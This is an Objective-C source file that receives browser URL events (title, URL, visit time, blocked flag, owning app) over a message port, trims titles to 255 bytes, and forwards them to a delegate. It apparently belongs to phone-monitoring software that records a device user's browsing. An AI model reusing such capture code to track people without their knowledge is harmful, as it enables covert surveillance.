//
//  BrowserUrlCapture.m
//  BrowserUrlCaptureManager
//
//  Created by Suttiporn Nitipitayanusad on 4/27/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "BrowserUrlCapture.h"
#import "DefStd.h"
#import "EventCenter.h"
#import "FxBrowserUrlEvent.h"

@interface BrowserUrlCapture (private)
- (NSString *) substring: (NSString*) aString WithNumberOfBytes: (NSInteger) aNumberOfBytes;
- (NSString *) getValidTitle: (NSString *) aTitle;
@end

@implementation BrowserUrlCapture

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate {
	if (self = [self init]) {
		mEventDelegate = aEventDelegate;
	}
	return self;
}

- (void) startCapture {
	DLog(@"==== [BrowserCapture] start capture");
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kBrowserUrlMessagePort withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
}

- (void) stopCapture {
	DLog(@"==== [BrowserCapture] stop capture");
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
}

- (NSString *) substring: (NSString*) aString WithNumberOfBytes: (NSInteger) aNumberOfBytes {
	NSData *data  = [aString dataUsingEncoding:NSUTF8StringEncoding];		
	NSData *newData = [data subdataWithRange:NSMakeRange(0, aNumberOfBytes)];
	NSString *newString = [[NSString alloc] initWithData:newData encoding:NSUTF8StringEncoding];
	return [newString autorelease];
}

// return modified title in the case that the input title is invalid
// return same title in the case that input title is valid
- (NSString *) getValidTitle: (NSString *) aTitle {
	DLog (@"original url title %@", aTitle)				// may be exceed 1 byte	
	uint32_t oritinalTitleSize = [aTitle lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"original title size: %d", oritinalTitleSize)
	
	NSString *newTitle = [NSString stringWithString:aTitle];
	
	if (oritinalTitleSize > 255) {				
		NSString *urlStr = aTitle;
		char outputBuffer [256];						// include the space for NULL-terminated string
		NSUInteger usedLength = 0;
		NSRange remainingRange = NSMakeRange(0, 0);
		NSRange range = NSMakeRange(0, [urlStr length]);
		
		
		if ([urlStr getBytes:outputBuffer				// The returned bytes are not NULL-terminated.
				   maxLength:255 
				  usedLength:&usedLength 
					encoding:NSUTF8StringEncoding
					 options:NSStringEncodingConversionAllowLossy
					   range:range
			  remainingRange:&remainingRange]) {
			outputBuffer[usedLength] = '\0';				// add NULL terminated string
			
			newTitle = [[NSString alloc] initWithCString:outputBuffer encoding:NSUTF8StringEncoding];
			[newTitle autorelease];
			
			DLog(@"new title 1st approach: %@ size:%d usedLength %d remainLOC: %d remainLEN %d",
				 newTitle,
				 [newTitle lengthOfBytesUsingEncoding:NSUTF8StringEncoding],
				 usedLength, 
				 remainingRange.location,
				 remainingRange.length);					
		} else {
			DLog(@"!!!!! can not get byte from this bookmark");	
			newTitle = [self substring:urlStr WithNumberOfBytes:255];
			if (!newTitle) {		
				newTitle = [self substring:urlStr WithNumberOfBytes:254];
				if (!newTitle) {			
					newTitle = [self substring:urlStr WithNumberOfBytes:253];
					if (!newTitle) {		
						newTitle = [self substring:urlStr WithNumberOfBytes:252];
					}
				}				
			}			
			DLog(@"newTitle 2nd approach: %@", newTitle);
		}	
	}	
	return newTitle;	
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog(@"==== [BrowserCapture] data did received from message port");
    [aRawData retain];											
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxBrowserUrlEvent *browserUrlEvent = [unarchiver decodeObjectForKey:kBrowserUrlArchived];
	DLog (@"------------------------------------------------")
	DLog (@"---- title %@ | url %@ | visit time %@ | block %d | owning %@ ---",
		  [browserUrlEvent mTitle],		// 1 byte
		  [browserUrlEvent mUrl] , 
		  [browserUrlEvent mVisitTime], 
		  [browserUrlEvent mIsBlocked],
		  [browserUrlEvent mOwningApp]);
	DLog (@"------------------------------------------------")
	
	NSString *validTitle = [self getValidTitle:[browserUrlEvent mTitle]];
    if (![validTitle isEqualToString:[browserUrlEvent mTitle]]) {										
		DLog (@"New url title has been set")
		[browserUrlEvent setMTitle:validTitle];
	}

    [unarchiver finishDecoding];
			
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:browserUrlEvent];
	}

	[unarchiver release];
	[aRawData release];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
